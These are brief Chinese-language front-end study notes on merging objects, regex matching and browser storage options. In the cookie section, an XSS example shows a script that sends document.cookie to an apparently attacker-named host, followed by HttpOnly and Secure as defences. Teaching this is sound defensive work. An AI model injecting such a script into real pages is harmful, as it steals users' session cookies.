- 如何合并多个对象?
    Object.assign({}, obj1, obj2)
- 如何查找字符串中指定的某一部分
    1. 定义一个正则 /[a-z]{3,6}/ig
    2. test
- 在浏览器如何缓存数据?
    - cookie 4KB 每次都会带上 影响http性能  
        XSS 跨站脚本攻击
        <script>
            fetch('http://www.heike.com?cookie='+document.cookie)
        <script>
        HttpOnly 不能有js带上cookie
        - 更安全？
            https  
            Secure 安全 非HTTPS链接发送cookie  
            签名  
    - localStorage/sessionStorage 5MB  
    - indexedDB 前端数据库 更大 支持复杂操作 事务  
    - Service worker 离线存储 不联网也能打开  